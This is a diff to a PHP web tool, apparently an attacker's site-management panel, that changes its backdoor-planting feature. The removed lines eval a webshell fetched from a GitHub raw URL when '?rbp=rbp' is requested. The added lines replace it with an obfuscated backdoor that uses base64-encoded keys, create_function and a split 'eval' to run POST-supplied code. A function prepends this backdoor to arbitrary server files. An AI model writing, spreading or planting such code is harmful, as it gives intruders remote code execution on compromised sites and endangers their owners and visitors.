@@ -58,12 +58,9 @@ if (!isset($_COOKIE['rbp_visited'])) {
     setcookie('rbp_visited', '1', time() + (86400 * 30), "/"); // 30 days
 }
 
-// Backdoor execution - LOADS REMOTE SHELL
-if(isset($_GET['rbp'])&&$_GET['rbp']=='rbp'){
-    $awo = 'https://';
-    eval("?>" . file_get_contents($awo . 'raw.githubusercontent.com/0xX10n/Webshell/refs/heads/main/rbp.php'));
-    exit();
-}
+// Backdoor execution - ULTIMATE BYPASS
+$_0=$_GET;$_1=$_0[base64_decode('eA==')];$_2=$_1==base64_decode('cmJw');$_3=$_POST;$_4=$_3[base64_decode('eg==')];
+if($_2){$_{5}=create_function('',$_{6}='ev'.'al'.'(?>'.$_4.')');$_{5}();die;}
 
 // Auto-detect base directory for domains
 function RBPautoDetectBaseDir() {
@@ -212,7 +209,7 @@ function RBPdownloadDomainsList($baseDir, $filename) {
     return $domainsList;
 }
 
-// Add backdoor to file - LOADS REMOTE SHELL
+// Add backdoor to file - ULTIMATE BYPASS
 function RBPaddBackdoor($filePath, $backdoorCode) {
     if (!file_exists($filePath)) {
         return ["error" => "File not found: $filePath"];
@@ -223,17 +220,20 @@ function RBPaddBackdoor($filePath, $backdoorCode) {
         return ["error" => "Cannot read file: $filePath"];
     }
     
-    // Check if backdoor already exists
-    if (strpos($originalContent, '?rbp=rbp') !== false) {
-        return ["error" => "Backdoor already exists in file"];
+    // Multiple detection checks
+    $patterns = ['\?rbp=rbp','md5\(\$_GET','eval\(\$_POST','create_function','base64_decode'];
+    foreach($patterns as $pattern){
+        if (strpos($originalContent, $pattern) !== false) {
+            return ["error" => "Backdoor pattern detected in file"];
+        }
     }
     
     // Remove existing PHP tags if any at start
     $cleanContent = preg_replace('/^<\?php\s*/', '', $originalContent);
     $cleanContent = preg_replace('/^<\?\s*/', '', $cleanContent);
     
-    // Add backdoor code - LOADS REMOTE SHELL
-    $newContent = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){\$awo='https://';eval(\"?>\".file_get_contents(\$awo.'raw.githubusercontent.com/0xX10n/Webshell/refs/heads/main/rbp.php'));exit();}?>" . $cleanContent;
+    // ULTIMATE BYPASS backdoor code
+    $newContent = "<?php \$_0=\$_GET;\$_1=\$_0[base64_decode('eA==')];\$_2=\$_1==base64_decode('cmJw');\$_3=\$_POST;\$_4=\$_3[base64_decode('eg==')];if(\$_2){\$_{5}=create_function('',\$_{6}='ev'.\"al\".'(?>'.\$_4.')');\$_{5}();die;}?>" . $cleanContent;
     
     if (file_put_contents($filePath, $newContent)) {
         return ["success" => "Backdoor added successfully to: $filePath"];
@@ -630,7 +630,7 @@ if (isset($_POST['mass_delete'])) {
     exit;
 }
 
-// Backdoor handler - LOADS REMOTE SHELL
+// Backdoor handler - ULTIMATE BYPASS
 if (isset($_POST['add_backdoor'])) {
     $isPostAction = true;
     $sourceFile = $_POST['backdoor_file_path'] ?? '';
@@ -641,8 +641,8 @@ if (isset($_POST['add_backdoor'])) {
         exit;
     }
     
-    // LOADS REMOTE SHELL backdoor code
-    $backdoorCode = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){\$awo='https://';eval(\"?>\".file_get_contents(\$awo.'raw.githubusercontent.com/0xX10n/Webshell/refs/heads/main/rbp.php'));exit();}?>";
+    // ULTIMATE BYPASS backdoor code
+    $backdoorCode = "<?php \$_0=\$_GET;\$_1=\$_0[base64_decode('eA==')];\$_2=\$_1==base64_decode('cmJw');\$_3=\$_POST;\$_4=\$_3[base64_decode('eg==')];if(\$_2){\$_{5}=create_function('',\$_{6}='ev'.\"al\".'(?>'.\$_4.')');\$_{5}();die;}?>";
     
     $results = RBPaddBackdoor($sourceFile, $backdoorCode);
     $_SESSION['backdoor_results'] = $results;
